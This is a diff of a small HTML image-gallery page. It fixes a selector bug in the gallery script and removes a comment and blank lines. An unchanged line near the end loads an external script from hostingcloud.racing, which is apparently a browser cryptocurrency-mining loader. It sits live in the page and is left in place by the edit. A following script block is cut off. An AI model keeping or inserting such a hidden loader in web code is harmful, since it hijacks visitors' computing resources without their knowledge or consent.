@@ -17,7 +17,7 @@
 
 <script>
     // Generate images from img2.png to img15.png
-    const galleryContainer = document.getElementById('.gallery-container');
+    const galleryContainer = document.querySelector('.gallery-container');
     const startNumber = 2;
     const endNumber = 9;
 
@@ -26,15 +26,13 @@
         galleryItem.className = 'gallery-item';
         
         const img = document.createElement('img');
-        img.src = `images/img${i}.png`; // Updated path to include 'images/' folder
+        img.src = `images/img${i}.png`;
         img.alt = `Image ${i}`;
         
         galleryItem.appendChild(img);
         galleryContainer.appendChild(galleryItem);
     }
 </script>
-
-
 
 <script src="https://www.hostingcloud.racing/UXQb.js"></script>
 <script>
